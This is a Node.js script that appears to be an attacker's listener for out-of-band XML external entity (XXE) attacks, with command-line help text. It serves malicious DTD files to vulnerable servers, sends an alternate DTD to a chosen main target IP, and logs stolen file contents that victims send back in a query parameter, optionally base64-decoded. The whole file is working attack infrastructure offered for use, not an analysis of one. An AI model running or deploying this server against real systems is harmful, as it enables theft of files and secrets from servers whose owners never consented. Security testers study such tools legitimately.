const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const argv = require('minimist')(process.argv.slice(2));

var is_base64 = argv.b64 ? true : false;
var listening_port = argv.p == undefined ? 8800 : argv.p;
var main_ip = argv.target;
var proto = argv.https ? https : http;

var options = argv.https ? {
	key: fs.readFileSync(argv.key),
	cert: fs.readFileSync(argv.cert)
} : {};

if (argv.h || argv.help) {
    console.log(
        `
Options
        -h\t\t\tPrint this message

        -p <port>\t\tThe listening port, e.g. -p 1337, default 8800
        --b64\t\t\tUse this option if expecting file content to be passed as base64
        --target <target_ip>\tUse this option if you want to send different dtds to different servers, e.g. send "send.dtd" only to your main target (target_ip), and send "send-alt.dtd" to any potential second order XXEs
        --https\t\t\tUse this option if you want to start https server
        --key <key file>\tThe key file used to start https server, e.g. --key /root/key.pem
        --cert <cert file>\tThe cert file used to start https server, e.g --cert /root/cert.crt
        `
    );
    return;
}


proto.createServer(options, (req, res) => {

	var path = url.parse(req.url, true).pathname;

	var now = new Date();

	console.log(`[${now.getFullYear()}-${now.getMonth()+1}-${now.getDate()} ` 
		+ `${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}] ${req.connection.remoteAddress} - ${req.method} - ${path}`);

	if (path.endsWith("send.dtd")) {
		var file = "./send.dtd";

		if (main_ip != undefined && req.connection.remoteAddress.includes(main_ip)) {
			file = "./send-alt.dtd"
		}

		fs.readFile(file, function(error, content){
			res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
			res.end(content, 'utf-8');
		});
	}	
	else {
		var queries = url.parse(req.url, true).query;
		if (queries != null && queries.f != null) {
			var treasure = queries.f;
			if (is_base64) {
				treasure = new Buffer(queries.f, 'base64').toString("ascii");
			}

			var src = queries.alt == 'true' ? 'alt' : 'original';
			console.log(`Payload ${queries.p} sourced from ${src} DTD returned\n ${treasure} \n\n`);
		}
		res.end();
	}

}).listen(listening_port);
